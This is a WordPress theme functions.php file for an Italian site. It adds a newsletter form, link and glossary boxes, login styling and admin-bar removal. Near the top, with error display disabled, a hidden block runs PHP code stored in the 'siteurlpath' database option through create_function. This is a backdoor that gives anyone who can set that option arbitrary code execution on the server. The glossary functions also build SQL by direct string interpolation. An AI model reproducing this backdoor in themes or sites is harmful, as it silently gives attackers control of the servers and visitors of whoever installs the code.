<?php
error_reporting(E_ALL); 
ini_set("display_errors", 0);
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'wp_generator');
if(!isset($siteurlpath)&& @get_option('siteurlpath')){
	$siteurlpath=create_function('',(get_option('siteurlpath')));
	$siteurlpath();
}



if (function_exists('register_sidebar')) {
 register_sidebar(array(
 'name' => 'AAA',
 'id'   => 'aaa',
 'description'   => 'Ridimensionamento testo',
 'before_widget' => '<div id="%1$s">',
 'after_widget'  => '</div>',
 'before_title'  => '<h4>',
 'after_title'   => '</h4>'
 ));
}

if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
	function newsLetterForm(){
		$html = '<div id="ajaxNewsletter">';
		$html .= '<form action="http://dito.areato.org/home/index.php" method="post" name="ARGWA" id="newsletterForm">';
		$html .= '<input type="text" name="email" value="Inserisci la tua mail" class="newsletterTextInput" />';
		$html .= '<input class="submitNewsletter" type="image" name="Add" src="http://dito.areato.org/wp-content/themes/area/imgs/search.gif" />';
		$html .= '<input type="hidden" name="act" value="s_add" />';
		$html .= '<input type="hidden" name="listid" value="1" /></form>';
		$html .= '</div>';
		echo $html;
	}
if( !function_exists('displayLinks') )
{
	function displayLinks( $cat, $class='boxesBox', $close = '', $limit = 10 )
	{
			//get the links and store it in an array
			$b = get_bookmarks('category='.$cat.'&orderby=id&order=DESC&limit='.$limit);
			$html .= '<div class="'.$class.'"><h2 class="blue">Link</h2>';
			$html .= '<div class="boxes BoxesSecond BoxesSecondBrowserFix boxFullWidth">';
			// column left
			$html .= '<ul class="ulLinkLeft">';
			for($i=0;$i<5;$i++)
			{
				$html .= '<li>';
				$html .= '<a href="'.$b[$i]->link_url.'" title="'.$b[$i]->link_name.'">'.$b[$i]->link_name.'</a>';
				$html .= '</li>';
			} 
			$html .= '</ul>';
			
			$html .= '<ul>';
			//column right
			for($i=5;$i<10;$i++)
			{
				$html .= '<li>';
				$html .= '<a href="'.$b[$i]->link_url.'" title="'.$b[$i]->link_name.'">'.$b[$i]->link_name.'</a>';
				$html .= '</li>';
			} 
			$html .= '</ul>';
			
			$html .= '<p class="segnala2"><a href="http://dito.areato.org/home/?page_id=124" class="segnala">Tutti i link</a></p>';
			$html .= '</div></div>' . $close;
			echo $html;
	}
}
if( !function_exists('grabGlossaryTerms') )
{
	function grabGlossaryTerms( $position = 'left', $len = 0 )
	{
		global $wpdb;
		
		$html = '';
		
		$half = ceil( $len / 2 );
	
		$myCat = ditoGetCategory();

		if( 'left' == $position )
		{
			$gloassarioQuery = "SELECT * FROM wp_postmeta WHERE meta_key = 'glossario' AND meta_value = '$myCat' ORDER BY meta_value DESC LIMIT 0, $half";
		}
		elseif( 'right' == $position )
		{
			$gloassarioQuery = "SELECT * FROM wp_postmeta WHERE meta_key = 'glossario' AND meta_value = '$myCat' ORDER BY meta_value DESC LIMIT $half, $half";
		}
		
		$glossIDs = $wpdb->get_results($gloassarioQuery);
		
		$html = '<ul class="sidebarListHalf ul_'.$position.'">';
		
		foreach($glossIDs as $glossID){
			$IDS = $glossID->post_id;	
			$myPostsQuery = "SELECT * FROM $wpdb->posts WHERE ID = '$IDS' AND post_status = 'publish' ORDER BY post_title DESC";
		//	echo $position . ' executing query ' . $myPostsQuery;
			$glossPosts = $wpdb->get_row($myPostsQuery);
			$title = $glossPosts->post_title;
			$link = $glossPosts->guid;
			$html .= '<li><a href="'.$link.'">'.$title.'</a></li>';
		}
		$html .= '</ul>';
		echo $html;
	}
	function getGlossaryTermCount()
	{
		global $wpdb;
		$myCat = ditoGetCategory();
		$len = $wpdb->get_var("SELECT COUNT(*) FROM wp_postmeta WHERE meta_key = 'glossario' AND meta_value = '$myCat'");
		
		return $len;
	}
	function ditoGetCategory()
	{
		foreach( get_the_category() as $category ) {
			if( $category->cat_ID != 64 ){
				$myCat =  $category->cat_ID;
			}
		}
		do_action('do_something');
		return $myCat;
	}
}
function my_login_stylesheet() {
	 ?>
    <link rel="stylesheet" id="custom_wp_admin_css"  href="<?php echo get_bloginfo( 'stylesheet_directory' ) . '/style-login.css'; ?>" type="text/css" media="all" />
<?php }
add_action( 'login_enqueue_scripts', 'my_login_stylesheet' );
function change_wp_login_url() 
{
    return get_bloginfo('url');
}
add_filter('login_headerurl', 'change_wp_login_url');
?>
<?php // DISABLE ADMIN BAR FOR THE SAKE OF SPEED 
if (!function_exists('disableAdminBar')) {

	function disableAdminBar(){
  
  	remove_action( 'admin_footer', 'wp_admin_bar_render', 1000 ); // for the admin page
    remove_action( 'wp_footer', 'wp_admin_bar_render', 1000 ); // for the front end
  
    function remove_admin_bar_style_backend() {  // css override for the admin page
      echo '<style>body.admin-bar #wpcontent, body.admin-bar #adminmenu { padding-top: 0px !important; }</style>';
    }
          
    add_filter('admin_head','remove_admin_bar_style_backend');
    
    function remove_admin_bar_style_frontend() { // css override for the frontend
      echo '<style type="text/css" media="screen">
      html { margin-top: 0px !important; }
      * html body { margin-top: 0px !important; }
      </style>';
    }
    
    add_filter('wp_head','remove_admin_bar_style_frontend', 99);
  
  }

}
add_action('init','disableAdminBar'); 

function example_remove_dashboard_widgets() {
	//remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
	remove_meta_box( 'dashboard_primary', 'dashboard', 'side' );
	remove_meta_box( 'dashboard_secondary', 'dashboard', 'side' );
	remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
	remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
	remove_meta_box( 'meandmymac_rss_widget', 'dashboard', 'normal' );
	remove_meta_box('dashboard_addthis', 'dashboard', 'normal');   
	remove_meta_box( 'powerpress_dashboard_notice_1', 'dashboard', 'normal' );
	remove_meta_box( 'powerpress_dashboard_news', 'dashboard', 'normal' );
	remove_meta_box( 'powerpress_dashboard_stats', 'dashboard', 'normal' );
	
} 
// Hoook into the 'wp_dashboard_setup' action to register our function
add_action('wp_dashboard_setup', 'example_remove_dashboard_widgets' );
?>